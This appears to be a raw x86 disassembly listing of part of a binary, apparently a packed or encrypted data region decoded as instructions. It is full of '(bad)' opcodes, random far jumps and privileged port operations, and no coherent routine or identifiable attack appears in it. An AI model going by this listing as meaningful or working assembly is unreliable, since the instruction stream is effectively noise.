  41d022:	add    BYTE PTR ds:0x8fb299e2,cl
  41d028:	dec    esp
  41d029:	push   ecx
  41d02a:	and    al,0xf3
  41d02c:	sbb    al,0xfc
  41d02e:	adc    BYTE PTR [ebp-0x67b5472a],ch
  41d034:	imul   esi,DWORD PTR [edi+0x2fcaaa6b],0xa43e761
  41d03e:	cmp    DWORD PTR [edi],esp
  41d040:	mov    cl,0x92
  41d042:	es xchg ebp,eax
  41d044:	pusha  
  41d045:	call   0x7d18c414
  41d04a:	sbb    DWORD PTR [eax],ecx
  41d04c:	jmp    0xc1f8:0xbf8e0a3f
  41d053:	addr16 pop edi
  41d055:	cli    
  41d056:	into   
  41d057:	or     bh,BYTE PTR [edx]
  41d059:	loope  0x41d0bc
  41d05b:	cmp    DWORD PTR [ebx-0x41],esi
  41d05e:	pop    edi
  41d05f:	ss mov ebp,0x81c85a89
  41d065:	jmp    DWORD PTR [ebp+ebp*4-0x16]
  41d069:	mov    ch,0xcd
  41d06b:	cdq    
  41d06c:	push   ss
  41d06d:	mov    DWORD PTR [eax],esi
  41d06f:	cmp    edi,DWORD PTR [ebp+0x5c9333f2]
  41d075:	(bad)  
  41d076:	xchg   ecx,eax
  41d077:	sub    edi,DWORD PTR [esi-0x38]
  41d07a:	loop   0x41d01a
  41d07c:	sub    BYTE PTR [ebx],cl
  41d07e:	pop    ebp
  41d07f:	xor    al,0x96
  41d081:	scas   al,BYTE PTR es:[edi]
  41d082:	mov    ah,0x92
  41d084:	mov    edx,0x73296816
  41d089:	push   ebp
  41d08a:	mov    ds:0x626394ef,al
  41d08f:	add    al,0x9a
  41d091:	mov    esp,0x3d00edfe
  41d096:	sub    ah,ch
  41d098:	std    
  41d099:	(bad)  
  41d09b:	aas    
  41d09c:	and    eax,0x74c1d8a7
  41d0a1:	loope  0x41d075
  41d0a3:	lods   al,BYTE PTR ds:[esi]
  41d0a4:	push   ebp
  41d0a5:	xchg   edi,eax
  41d0a6:	inc    esi
  41d0a7:	push   ss
  41d0a8:	mov    ds:0xff0f0acc,eax
  41d0ad:	rcl    BYTE PTR ss:[ebx+0x4abba89c],cl
  41d0b4:	pop    es
  41d0b5:	mov    dh,0x44
  41d0b7:	fwait
  41d0b8:	push   ds
  41d0b9:	clc    
  41d0ba:	jecxz  0x41d117
  41d0bc:	xor    eax,0xc1ad3b8e
  41d0c1:	jg     0x41d10b
  41d0c3:	adc    ebx,ecx
  41d0c5:	repnz sbb al,0x26
  41d0c8:	(bad)  
  41d0c9:	fisub  WORD PTR [eax-0x673d07c9]
  41d0cf:	mov    ch,0xb0
  41d0d1:	push   esp
  41d0d2:	push   ds
  41d0d3:	jb     0x41d107
  41d0d5:	dec    ebx
  41d0d6:	mov    ecx,0x5525e395
  41d0db:	mov    DWORD PTR [eax],ebp
  41d0dd:	(bad)  
  41d0df:	imul   ecx,DWORD PTR [edi+0x4855b8f9],0xffffffcc
  41d0e6:	fs mov dl,0x2f
  41d0e9:	sbb    al,0xc1
  41d0eb:	sbb    BYTE PTR [esi+0x2a60fbe9],bh
  41d0f1:	repz ret 0x926f
  41d0f5:	push   esp
  41d0f6:	outs   dx,BYTE PTR ds:[esi]
  41d0f7:	inc    eax
  41d0f8:	call   0xd45d4c1e
  41d0fd:	out    0xc3,eax
  41d0ff:	adc    DWORD PTR [ebp+0x70ea258a],edx
  41d105:	fwait
  41d106:	pop    ecx
  41d107:	pop    es
  41d108:	inc    esi
  41d109:	and    al,0x9e
  41d10b:	imul   BYTE PTR [ebx+0x58b9ac02]
  41d111:	mov    DWORD PTR [esi],esp
  41d113:	fnstsw WORD PTR [ebp-0x71]
  41d116:	jmp    0x41d0d7
  41d118:	mov    ebx,0xb1392237
  41d11d:	jmp    0x3ea:0x206a67b6
  41d124:	jmp    0x1fcd:0x6bee4a85
  41d12b:	or     ecx,DWORD PTR [edi+esi*1+0x72]
  41d12f:	rol    DWORD PTR [ebx-0x123b3d9b],1
  41d135:	retf   
  41d136:	xchg   ecx,eax
  41d137:	xchg   DWORD PTR [esi-0x53],edx
  41d13a:	push   0xffffffbc
  41d13c:	lds    ebp,FWORD PTR [ebp-0x64]
  41d13f:	outs   dx,DWORD PTR ds:[esi]
  41d140:	mov    bh,0x90
  41d142:	lahf   
  41d143:	cdq    
  41d144:	add    BYTE PTR [ebx+0x698f3c76],0xb3
  41d14b:	sti    
  41d14c:	push   edi
  41d14d:	adc    esi,DWORD PTR [ebx]
  41d14f:	cli    
  41d150:	or     al,0xfb
  41d152:	and    BYTE PTR [edx+0x694a5c6e],ah
  41d158:	icebp  
  41d159:	sub    eax,0x616ee488
  41d15e:	push   0xb5f460a
  41d163:	jno    0x41d14f
  41d165:	int    0x38
  41d167:	retf   
  41d168:	jbe    0x41d19b
  41d16a:	mov    WORD PTR [esi],?
  41d16c:	rcl    DWORD PTR [ebx+ebp*4-0x6deb547a],0x52
  41d174:	dec    edi
  41d175:	cdq    
  41d176:	jo     0x41d110
  41d178:	aaa    
  41d179:	mov    bh,0x5f
  41d17b:	xchg   edi,eax
  41d17c:	enter  0x1849,0xbf
  41d180:	out    0x2e,eax
  41d182:	stc    
  41d183:	add    eax,0x42faa690
  41d188:	jo     0x41d15c
  41d18a:	and    esi,0x3cae2428
  41d190:	inc    BYTE PTR [edx]
  41d192:	shl    BYTE PTR [edx],0x8b
  41d195:	add    eax,DWORD PTR [esi]
  41d197:	repz (bad)
  41d19a:	out    0xe2,al
  41d19c:	add    dl,BYTE PTR [edi+0x1e48414f]
  41d1a2:	out    0xf0,al
  41d1a4:	int3   
  41d1a5:	mov    esp,esi
  41d1a7:	push   0x4c36bb28
  41d1ac:	inc    esi
  41d1ad:	rcl    BYTE PTR [edi-0x2f],cl
  41d1b0:	cmp    eax,0x3a431254
  41d1b5:	fnstcw WORD PTR [eax-0x14]
  41d1b8:	lods   eax,DWORD PTR ds:[esi]
  41d1b9:	ins    BYTE PTR es:[edi],dx
  41d1ba:	xchg   ecx,eax
  41d1bb:	in     al,dx
  41d1bc:	ins    BYTE PTR es:[edi],dx
  41d1bd:	jbe    0x41d23e
  41d1bf:	and    DWORD PTR [edx+0x45986a00],ebp
  41d1c5:	mov    al,0x94
  41d1c7:	inc    edx
  41d1c8:	arpl   WORD PTR [eax+0x11],dx
  41d1cb:	div    DWORD PTR [ebp+0x23]
  41d1ce:	sub    BYTE PTR [esi-0x7d83906],bl
  41d1d4:	cmp    BYTE PTR [edx],0x5b
  41d1d7:	mov    eax,ds:0x8dbcf8e4
  41d1dc:	and    eax,0x777a3a23
  41d1e1:	test   eax,0x79044ac
  41d1e6:	xlat   BYTE PTR ds:[ebx]
  41d1e7:	out    0x8d,eax
  41d1e9:	cmovg  edi,DWORD PTR [esi-0x1a8bc9c4]
  41d1f0:	mov    cl,BYTE PTR [esi+0x16]
  41d1f3:	add    al,0x75
  41d1f5:	mov    WORD PTR [eax+0x28bbfe95],ds
  41d1fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1fc:	in     al,dx
  41d1fd:	mov    bh,BYTE PTR [ebp+0x65]
  41d200:	mov    al,ds:0xf42cf9e9
  41d205:	in     al,dx
  41d206:	dec    ebp
  41d207:	ins    DWORD PTR es:[edi],dx
  41d208:	xor    DWORD PTR [ecx],0x46
  41d20b:	fwait
  41d20c:	cmp    ebp,DWORD PTR [eax+0x173d7e59]
  41d212:	fst    DWORD PTR [esi+eiz*4-0x5f]
  41d216:	xor    eax,edi
  41d218:	jmp    0xec:0xf5edb0c9
  41d21f:	sbb    eax,0xea1fc1ff
  41d224:	mov    edx,DWORD PTR [ebp-0x55]
  41d227:	ja     0x41d265
  41d229:	ret    
  41d22a:	add    ebp,edi
  41d22c:	enter  0xb007,0x66
  41d230:	retf   
  41d231:	dec    esi
  41d232:	popa   
  41d233:	add    dh,ah
  41d235:	xchg   ecx,eax
  41d236:	mov    ds:0xd6ed5201,al
  41d23b:	stc    
  41d23c:	push   ebp
  41d23d:	mov    bl,0x7f
  41d23f:	xlat   BYTE PTR ds:[ebx]
  41d240:	rcl    DWORD PTR ds:0x78a1bcc4,0x9a
  41d247:	jecxz  0x41d2aa
  41d249:	inc    esi
  41d24a:	adc    ebx,ebx
  41d24c:	fst    QWORD PTR [esi+0x569334ac]
  41d252:	into   
  41d253:	jmp    0x41d2b3
  41d255:	xor    DWORD PTR [ebx+0x465aa449],edi
  41d25b:	sahf   
  41d25c:	mov    esi,0x33513e80
  41d261:	cmp    al,0x82
  41d263:	out    0x70,al
  41d265:	shl    DWORD PTR [esi+0x64],cl
  41d268:	sbb    BYTE PTR [ecx+0x5dbc5cd1],bl
  41d26e:	test   edx,ebp
  41d270:	pop    esi
  41d271:	call   0x71b5fc4
  41d276:	jo     0x41d2ef
  41d278:	or     BYTE PTR [edi+0x30],bh
  41d27b:	(bad)  
  41d27c:	pop    ecx
  41d27d:	fnstcw WORD PTR [edx*2-0x3022ee31]
  41d284:	outs   dx,DWORD PTR ds:[esi]
  41d285:	or     al,0x2a
  41d287:	sahf   
  41d288:	in     al,dx
  41d289:	mov    ds:0x4ecd2fcc,eax
  41d28e:	aas    
  41d28f:	pop    edi
  41d290:	push   ss
  41d291:	dec    ecx
  41d292:	mov    ebx,0xd9905cfe
  41d297:	inc    ecx
  41d298:	int3   
  41d299:	xchg   esp,eax
  41d29a:	or     DWORD PTR [ebx],0x45c98538
  41d2a0:	xor    DWORD PTR [edi+edx*1+0x59f7bedd],ebx
  41d2a7:	xchg   esp,eax
  41d2a8:	scas   eax,DWORD PTR es:[edi]
  41d2a9:	jecxz  0x41d31b
  41d2ab:	mov    al,0xc3
  41d2ad:	or     ebx,esp
  41d2af:	scas   eax,DWORD PTR es:[edi]
  41d2b0:	mov    al,0xaf
  41d2b2:	cld    
  41d2b3:	add    eax,DWORD PTR [edx-0x64614acc]
  41d2b9:	and    al,bh
  41d2bb:	lahf   
  41d2bc:	mov    ah,0xc7
  41d2be:	pop    edx
  41d2bf:	jbe    0x41d2e4
  41d2c1:	sub    eax,DWORD PTR [esp+ebp*2-0x80]
  41d2c5:	or     edx,esi
  41d2c7:	lock add DWORD PTR [ecx-0x7c],0x3c290917
  41d2cf:	imul   eax,ebp,0x3bfaf960
  41d2d5:	xor    cl,bh
  41d2d7:	pushf  
  41d2d8:	sub    ch,ah
  41d2da:	retf   
  41d2db:	mov    edi,DWORD PTR [ebx+ebx*2-0x7b2ee996]
  41d2e2:	jg     0x41d34c
  41d2e4:	stos   BYTE PTR es:[edi],al
  41d2e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2e6:	pop    ebx
  41d2e7:	mov    eax,ds:0x5af5db4d
  41d2ec:	test   DWORD PTR [ebp-0x74],ebx
  41d2ef:	mov    ebp,0x8586e97f
  41d2f4:	and    bh,BYTE PTR [eax+esi*2]
  41d2f7:	mov    edx,0x608bf1e5
  41d2fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2fd:	push   edi
  41d2fe:	dec    eax
  41d2ff:	inc    ecx
  41d300:	add    bh,bh
  41d302:	jle    0x41d2df
  41d304:	jno    0x41d2bb
  41d306:	add    edi,eax
  41d308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d309:	and    al,0x7
  41d30b:	and    al,0xe1
  41d30d:	sub    al,0xa1
  41d30f:	rcr    bl,0x79
  41d312:	adc    ebp,DWORD PTR [bx+si-0x245b]
  41d317:	sti    
  41d318:	neg    DWORD PTR [ebx-0x16]
  41d31b:	mov    BYTE PTR [edi],dl
  41d31d:	sti    
  41d31e:	lock push es
  41d320:	daa    
  41d321:	sub    cl,BYTE PTR gs:[esi+0x71]
  41d325:	lock push ecx
  41d327:	addr16 js 0x41d353
  41d32a:	cwde   
  41d32b:	mov    ebp,0x10c4c685
  41d330:	and    DWORD PTR [ecx-0x1d99a992],esp
  41d336:	jecxz  0x41d2e1
  41d338:	mov    esp,0xb65e0865
  41d33d:	sti    
  41d33e:	int    0xca
  41d340:	sub    ch,BYTE PTR [edi]
  41d342:	fdivr  QWORD PTR [edx]
  41d344:	sbb    al,0xfd
  41d346:	xchg   DWORD PTR [edi+esi*8],esi
  41d349:	mov    cl,0xdc
  41d34b:	inc    esi
  41d34c:	mov    al,ds:0xd853f396
  41d351:	mov    al,ds:0x9fa9151a
  41d356:	mov    al,0x3
  41d358:	dec    ebx
  41d359:	shl    cl,1
  41d35b:	scas   eax,DWORD PTR es:[edi]
  41d35c:	test   edi,edx
  41d35e:	mov    cl,0x28
  41d360:	push   esi
  41d361:	pop    ebx
  41d362:	sbb    DWORD PTR [ebx-0x1b2b71d9],ebx
  41d368:	rcl    BYTE PTR [ebp-0x58],cl
  41d36b:	push   eax
  41d36c:	pop    edi
  41d36d:	add    dl,BYTE PTR [eax+0xe]
  41d370:	sahf   
  41d371:	inc    ebx
  41d372:	pusha  
  41d373:	mov    al,0xed
  41d375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d376:	daa    
  41d377:	xor    DWORD PTR gs:[edx-0x4fbca4b1],ecx
  41d37e:	push   ebp
  41d37f:	xlat   BYTE PTR ds:[ebx]
  41d380:	or     al,0x6d
  41d382:	sub    DWORD PTR [edx],eax
  41d384:	outs   dx,DWORD PTR ds:[esi]
  41d385:	pop    ds
  41d386:	je     0x41d31e
  41d388:	dec    esi
  41d389:	mov    eax,ds:0xf3c53b9
  41d38e:	mov    eax,0xb67b48c5
  41d393:	cmp    ecx,DWORD PTR [ebx+0x9]
  41d396:	repz test esi,ebp
  41d399:	inc    edi
  41d39a:	mov    al,0x14
  41d39c:	outs   dx,BYTE PTR ds:[esi]
  41d39d:	bsf    eax,esp
  41d3a0:	add    BYTE PTR [esi+edi*8+0x217e3b81],bl
  41d3a7:	repnz lods eax,DWORD PTR ds:[esi]
  41d3a9:	out    dx,al
  41d3aa:	ja     0x41d3bb
  41d3ac:	mov    bh,0x9b
  41d3ae:	push   es
  41d3af:	jbe    0x41d362
  41d3b1:	xor    BYTE PTR [edi-0x72],dh
  41d3b4:	call   0x6135cf6d
  41d3b9:	jmp    0x41d351
  41d3bb:	mov    ds:0xa8a66a93,al
  41d3c0:	push   esp
  41d3c1:	jg     0x41d3dc
  41d3c3:	jnp    0x41d3ad
  41d3c5:	pop    eax
  41d3c6:	mov    al,ds:0x3c775b51
  41d3cb:	retf   0x15c7
  41d3ce:	fadd   st,st(5)
  41d3d0:	ins    DWORD PTR es:[edi],dx
  41d3d1:	and    BYTE PTR [ebp+ebx*8+0x23ee129a],cl
  41d3d8:	xlat   BYTE PTR ds:[ebx]
  41d3d9:	pop    ebx
  41d3da:	mov    ebx,eax
  41d3dc:	mov    ds:0x6613b2a4,eax
  41d3e1:	imul   edx
  41d3e3:	or     al,0x2f
  41d3e5:	jae    0x41d3e9
  41d3e7:	jmp    0x54412488
  41d3ec:	sub    eax,0x41ac2e4b
  41d3f1:	(bad)  
  41d3f2:	jle    0x41d416
  41d3f4:	scas   ax,WORD PTR es:[edi]
  41d3f6:	sbb    BYTE PTR [eax-0x27832839],cl
  41d3fc:	pushf  
  41d3fd:	xchg   ebp,eax
  41d3fe:	xlat   BYTE PTR ds:[ebx]
  41d3ff:	adc    ebx,DWORD PTR [esi+0x526650aa]
  41d405:	ins    BYTE PTR es:[edi],dx
  41d406:	adc    al,0x37
  41d408:	cmc    
  41d409:	pop    ds
  41d40a:	std    
  41d40b:	outs   dx,DWORD PTR ds:[esi]
  41d40c:	(bad)  
  41d40d:	adc    ah,al
  41d40f:	mov    eax,0x9403bb11
  41d414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d415:	jle    0x41d3cd
  41d417:	mov    ebx,DWORD PTR [ebx]
  41d419:	das    
  41d41a:	std    
  41d41b:	js     0x41d3a1
  41d41d:	mov    edx,0x400a2b9
  41d422:	fidiv  DWORD PTR [ebx]
  41d424:	(bad)  
  41d425:	jns    0x41d424
  41d427:	in     eax,0x72
  41d429:	and    al,0x1d
  41d42b:	xor    esi,DWORD PTR [esi-0x32]
  41d42e:	xchg   esi,eax
  41d42f:	cwde   
  41d430:	adc    dl,cl
  41d432:	ret    
  41d433:	cmp    dh,BYTE PTR [esi+ebx*2+0x7bd0d0b4]
  41d43a:	into   
  41d43b:	mov    esi,0xa1760b3a
  41d440:	add    BYTE PTR [edx+esi*2],bl
  41d443:	sub    eax,0x438be3cf
  41d448:	int    0xa2
  41d44a:	loopne 0x41d4bd
  41d44c:	and    cl,BYTE PTR [edx-0x15]
  41d44f:	loopne 0x41d4c1
  41d451:	pop    es
  41d452:	retf   0xc547
  41d455:	xor    esp,0x6bc81d27
  41d45b:	sti    
  41d45c:	mov    bl,0x3e
  41d45e:	jle    0x41d428
  41d460:	nop
  41d461:	mul    BYTE PTR [edi]
  41d463:	mov    cl,0xe1
  41d465:	mov    WORD PTR [edx],es
  41d467:	(bad)  
  41d468:	gs std 
  41d46a:	call   0x8706:0x915b4bdb
  41d471:	or     al,0xe9
  41d473:	dec    esp
  41d474:	hlt    
  41d475:	dec    esi
  41d476:	mov    ds:0xb05d48e,eax
  41d47b:	idiv   edi
  41d47d:	push   ebp
  41d47e:	inc    ebp
  41d47f:	js     0x41d4aa
  41d481:	pop    eax
  41d482:	test   al,0xef
  41d484:	sbb    eax,0x44d4997
  41d489:	mov    dl,0x86
  41d48b:	cli    
  41d48c:	mov    eax,0x9f95fe6d
  41d491:	js     0x41d45c
  41d493:	jl     0x41d466
  41d495:	and    al,0x83
  41d497:	inc    esp
  41d498:	xchg   BYTE PTR [ecx],cl
  41d49a:	scas   eax,DWORD PTR es:[edi]
  41d49b:	mov    edi,0x7a67b956
  41d4a0:	cmp    DWORD PTR [esi-0x22d00e2d],ebx
  41d4a6:	icebp  
  41d4a7:	out    0x83,eax
  41d4a9:	gs push ecx
  41d4ab:	adc    eax,DWORD PTR [ecx-0x20e99dc9]
  41d4b1:	jge    0x41d4d0
  41d4b3:	add    esp,ecx
  41d4b5:	xchg   ebx,eax
  41d4b6:	pop    ss
  41d4b7:	popf   
  41d4b8:	push   cs
  41d4b9:	ins    BYTE PTR es:[edi],dx
  41d4ba:	jns    0x41d4b9
  41d4bc:	pop    ecx
  41d4bd:	xor    eax,0x1444f85f
  41d4c2:	(bad)  
  41d4c3:	dec    esp
  41d4c4:	push   edx
  41d4c5:	shl    BYTE PTR [eax+0x6b03be5e],cl
  41d4cb:	ret    
  41d4cc:	cmp    BYTE PTR [ecx],al
  41d4ce:	loopne 0x41d532
  41d4d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4d1:	test   DWORD PTR ss:[edx-0x2c],edx
  41d4d5:	adc    eax,0x98516465
  41d4da:	cmp    BYTE PTR [edx],bl
  41d4dc:	cmp    bh,BYTE PTR [esi]
  41d4de:	add    eax,0x16d07131
  41d4e3:	rol    BYTE PTR [edi-0x7f],1
  41d4e6:	push   cs
  41d4e7:	aas    
  41d4e8:	push   ds
  41d4e9:	jp     0x41d532
  41d4eb:	xchg   BYTE PTR ds:0x7bf0befe,dl
  41d4f1:	xor    dh,BYTE PTR [ebx+0xbcf8416]
  41d4f7:	lahf   
  41d4f8:	je     0x41d490
  41d4fa:	loopne 0x41d52e
  41d4fc:	idiv   DWORD PTR [ecx+eax*8]
  41d4ff:	mov    ds:0x392edf2d,eax
  41d504:	fisttp DWORD PTR [ebp+0x6e7a4f1b]
  41d50a:	pop    ecx
  41d50b:	aad    0x64
  41d50d:	in     al,dx
  41d50e:	mov    esi,0xc5e2b17a
  41d513:	lock push ecx
  41d515:	pop    ebp
  41d516:	push   es
  41d517:	dec    ebp
  41d518:	test   eax,0x6ac57b92
  41d51d:	mov    WORD PTR [edi],ds
  41d51f:	fistp  QWORD PTR [edi-0x4bb6556c]
  41d525:	outs   dx,BYTE PTR ds:[esi]
  41d526:	es jl  0x41d54a
  41d529:	mov    ecx,0x7225b709
  41d52e:	add    eax,0x73a2a1b2
  41d533:	pop    ebp
  41d534:	(bad)  [ecx+0x153fcdb1]
  41d53a:	adc    ah,ch
  41d53c:	adc    BYTE PTR [ecx+0x68],ch
  41d53f:	sub    DWORD PTR [ebx],0x814b57a0
  41d545:	ss jmp 0x41d541
  41d548:	xor    bh,BYTE PTR [ecx]
  41d54a:	pop    ebx
  41d54b:	mov    cl,BYTE PTR [edx]
  41d54d:	xchg   edi,eax
  41d54e:	jecxz  0x41d5a7
  41d550:	mov    dh,0x37
  41d552:	dec    ebx
  41d553:	xor    al,BYTE PTR [eax]
  41d555:	xor    ecx,edi
  41d557:	fwait
  41d558:	outs   dx,DWORD PTR ds:[esi]
  41d559:	in     al,0xd7
  41d55b:	pop    ebx
  41d55c:	rcr    BYTE PTR [ebx-0x6ae23209],0x6e
  41d563:	xchg   ebx,eax
  41d564:	or     eax,0xa487d3e9
  41d569:	pop    edx
  41d56a:	add    al,0xb3
  41d56c:	sub    eax,0xc94011a1
  41d571:	mov    ebx,DWORD PTR ds:[edx-0x57e18d99]
  41d578:	cwde   
  41d579:	dec    ebp
  41d57a:	jne    0x41d511
  41d57c:	mov    al,ds:0xcc747ba3
  41d581:	int3   
  41d582:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d584:	fs hlt 
  41d586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d587:	aad    0xdf
  41d589:	ins    BYTE PTR es:[edi],dx
  41d58a:	lock push cs
  41d58c:	push   ebp
  41d58d:	mov    cl,0x4
  41d58f:	push   ds
  41d590:	add    edi,DWORD PTR [edx+0x71]
  41d593:	jne    0x41d5a7
  41d595:	cmp    eax,0xfffffff2
  41d598:	dec    ebp
  41d599:	out    0x53,al
  41d59b:	adc    ecx,edi
  41d59d:	fistp  DWORD PTR [esi]
  41d59f:	sub    esp,DWORD PTR [ebp+0x42]
  41d5a2:	xchg   DWORD PTR [ecx],esi
  41d5a4:	jecxz  0x41d56d
  41d5a6:	retf   
  41d5a7:	xlat   BYTE PTR ds:[ebx]
  41d5a8:	or     BYTE PTR [esp+ebx*8+0x4b1836a9],dh
  41d5af:	lods   eax,DWORD PTR ds:[esi]
  41d5b0:	(bad)  
  41d5b1:	fistp  QWORD PTR [edx-0x2]
  41d5b4:	pop    esi
  41d5b5:	add    ebp,eax
  41d5b7:	imul   ecx,DWORD PTR [edx],0xfa5c194e
  41d5bd:	daa    
  41d5be:	cmp    al,0xd6
  41d5c0:	stos   BYTE PTR es:[edi],al
  41d5c1:	scas   al,BYTE PTR es:[edi]
  41d5c2:	out    0x95,eax
  41d5c4:	retf   
  41d5c5:	fwait
  41d5c6:	push   ecx
  41d5c7:	shl    ah,0x38
  41d5ca:	(bad)  
  41d5cb:	mov    ebx,0x6522d9a3
  41d5d0:	mov    gs,esi
  41d5d2:	repnz int 0x4d
  41d5d5:	mov    ebx,0xb4a160b8
  41d5da:	jp     0x41d62c
  41d5dc:	push   es
  41d5dd:	mov    ebx,es
  41d5df:	pop    ecx
  41d5e0:	and    eax,DWORD PTR [ebp+0x42]
  41d5e3:	lods   eax,DWORD PTR ds:[esi]
  41d5e4:	or     bl,bh
  41d5e6:	out    dx,al
  41d5e7:	sbb    al,0xa8
  41d5e9:	and    ecx,DWORD PTR [edx]
  41d5eb:	in     al,dx
  41d5ec:	add    DWORD PTR [esi+0x25],esi
  41d5ef:	cdq    
  41d5f0:	pop    ds
  41d5f1:	bnd jp 0x41d591
  41d5f4:	outs   dx,BYTE PTR ds:[esi]
  41d5f5:	or     eax,0x6cf35814
  41d5fa:	leave  
  41d5fb:	mov    ds:0xb0c101f1,al
  41d600:	xor    eax,0x42f00b3f
  41d605:	pop    ebp
  41d606:	pop    ds
  41d607:	out    0x44,eax
  41d609:	daa    
  41d60a:	ds gs push cs
  41d60d:	sahf   
  41d60e:	fwait
  41d60f:	push   esp
  41d610:	inc    esp
  41d611:	call   0xe3f8:0x8370d886
  41d618:	adc    al,0x47
  41d61a:	sbb    DWORD PTR [edi-0xaba4d41],edx
  41d620:	leave  
  41d621:	ror    BYTE PTR [eax-0x2b2087ba],1
  41d627:	push   esi
  41d628:	sbb    bl,bh
  41d62a:	and    eax,0x2deed052
  41d62f:	popa   
  41d630:	mov    al,ds:0x8894db6b
  41d635:	cmc    
  41d636:	test   ecx,ebx
  41d638:	xor    eax,0x5997525f
  41d63d:	inc    esi
  41d63e:	mov    ecx,0x4c49e3cd
  41d643:	mov    ch,0x31
  41d645:	and    bl,al
  41d647:	fdiv   QWORD PTR [ebp+0x7d]
  41d64a:	pop    ds
  41d64b:	xchg   esp,eax
  41d64c:	(bad)  
  41d64d:	sub    esp,DWORD PTR [eax+0x55053b73]
  41d653:	sub    BYTE PTR [edi+0x627ac79a],al
  41d659:	or     al,0xbd
  41d65b:	add    eax,0xa736851
  41d660:	gs mov ebx,0x4dad3d23
  41d666:	cmp    BYTE PTR [edi+0x38],bl
  41d669:	mov    edi,0xb9570be
  41d66e:	sub    ebp,ebx
  41d670:	leave  
  41d671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d672:	daa    
  41d673:	iret   
  41d674:	test   al,0xb9
  41d676:	in     eax,0xdb
  41d678:	adc    DWORD PTR [ebx+0x2],0x2c2db919
  41d67f:	fcomp  DWORD PTR [eax-0x22921a5f]
  41d685:	add    eax,0x1cd1514c
  41d68a:	retf   
  41d68b:	enter  0xd31c,0xe5
  41d68f:	pop    ebx
  41d690:	(bad)  
  41d692:	pushf  
  41d693:	xor    DWORD PTR [ebx],edi
  41d695:	fs stc 
  41d697:	xchg   esi,eax
  41d698:	test   eax,0xb02dbb24
  41d69d:	(bad)  
  41d69e:	hlt    
  41d69f:	jmp    0x90ca:0xe449e708
  41d6a6:	lock mov ecx,DWORD PTR [edi+0x699f8850]
  41d6ad:	dec    eax
  41d6ae:	adc    DWORD PTR [ebx],0xfffffff5
  41d6b1:	adc    ebx,0x2f
  41d6b4:	sub    DWORD PTR [ebx-0xe33492],0x3e21f388
  41d6be:	jge    0x41d683
  41d6c0:	pop    ecx
  41d6c1:	mov    edx,0xd077b074
  41d6c6:	adc    eax,0x917f3126
  41d6cb:	and    dh,BYTE PTR [eax]
  41d6cd:	icebp  
  41d6ce:	mov    al,0xae
  41d6d0:	pop    ebp
  41d6d1:	nop
  41d6d2:	xchg   ebx,eax
  41d6d3:	in     eax,0x35
  41d6d5:	lea    esp,[ecx+0x53]
  41d6d8:	clc    
  41d6d9:	pop    ss
  41d6da:	(bad)  
  41d6db:	pop    ss
  41d6dc:	std    
  41d6dd:	lds    esp,FWORD PTR [edx-0x4d0aa42b]
  41d6e3:	test   DWORD PTR [ebx+0xf],0xa90062a3
  41d6ea:	jmp    0x41d74c
  41d6ec:	cli    
  41d6ed:	cmp    BYTE PTR [ecx-0xf],al
  41d6f0:	ss sbb al,0x7f
  41d6f3:	push   ecx
  41d6f4:	icebp  
  41d6f5:	adc    eax,0xbcb1efba
  41d6fa:	call   0xf24f:0x45e275ce
  41d701:	mov    bh,0x9b
  41d703:	clc    
  41d704:	xor    eax,0xda62a04c
  41d709:	add    al,0x5e
  41d70b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d70c:	mov    ebx,0xb9c032b4
  41d711:	or     al,0x9e
  41d713:	stos   BYTE PTR es:[edi],al
  41d714:	adc    ebp,edi
  41d716:	lea    esp,[ebx+0x2e2d30f3]
  41d71c:	sub    BYTE PTR [ebx-0x17fda0f],bl
  41d722:	mov    eax,0x47729613
  41d727:	fnstenv [esi+0x2b]
  41d72a:	aas    
  41d72b:	and    al,0x1d
  41d72d:	ret    0x3ac5
  41d730:	push   cs
  41d731:	nop
  41d732:	jo     0x41d7a1
  41d734:	add    eax,0x2a4bde9b
  41d739:	adc    al,0x57
  41d73b:	out    dx,eax
  41d73c:	lods   al,BYTE PTR ds:[esi]
  41d73d:	outs   dx,BYTE PTR ds:[esi]
  41d73e:	arpl   WORD PTR [edx-0x37],bx
  41d741:	imul   bh
  41d743:	inc    ebp
  41d744:	push   0xffffffc2
  41d746:	add    esi,DWORD PTR [ebp-0xefcc17a]
  41d74c:	mov    eax,ds:0xc7dca68a
  41d751:	scas   al,BYTE PTR es:[edi]
  41d752:	sar    BYTE PTR [edi-0x747da655],0xbd
  41d759:	sar    cl,cl
  41d75b:	(bad)  
  41d75f:	mov    dh,0x94
  41d761:	(bad)  
  41d762:	out    0x4,al
  41d764:	jle    0x41d7d3
  41d766:	out    dx,al
  41d767:	cmp    edi,esi
  41d769:	mov    al,0xec
  41d76b:	xchg   esi,eax
  41d76c:	int    0xd1
  41d76e:	aam    0xab
  41d770:	adc    bp,WORD PTR [ebp+0x38]
  41d774:	pusha  
  41d775:	inc    esi
  41d776:	xor    DWORD PTR [eax-0x3c],ebx
  41d779:	daa    
  41d77a:	xor    eax,0x9c8a3e45
  41d77f:	jge    0x41d79f
  41d781:	les    edx,FWORD PTR [eax+0xe]
  41d784:	mov    cl,0xec
  41d786:	or     DWORD PTR [ebp+ecx*8-0x42],ebx
  41d78a:	cmp    al,0x17
  41d78c:	(bad)  
  41d78d:	sbb    DWORD PTR [ecx],edi
  41d78f:	call   0x7bb3:0x5d5cde1d
  41d796:	sub    edi,DWORD PTR [ebp+0x40]
  41d799:	out    0x35,al
  41d79b:	add    dh,BYTE PTR [edi+0x2e]
  41d79e:	dec    eax
  41d79f:	fst    QWORD PTR [ecx+ebx*1+0x4]
  41d7a3:	jbe    0x41d740
  41d7a5:	or     ecx,DWORD PTR [ebx+0x7b30a1ac]
  41d7ab:	sbb    ch,ah
  41d7ad:	repnz aad 0xd5
  41d7b0:	(bad)  
  41d7b1:	mov    ecx,0x87f81b8d
  41d7b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
